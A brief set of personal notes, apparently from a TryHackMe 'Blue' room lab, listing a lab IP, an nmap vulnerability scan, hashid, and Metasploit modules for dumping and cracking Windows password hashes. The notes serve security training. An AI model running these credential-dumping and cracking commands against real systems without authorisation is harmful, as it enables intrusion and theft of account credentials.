# Blue Room on TryHackMe

IP: `10.10.120.200`

Went through several IPs

`use post/windows/gather/hashdump`
`use auxiliary/analyze/crack_windows`

`nmap -sS --script vuln $IP`

`hashid -m < hashes.txt`
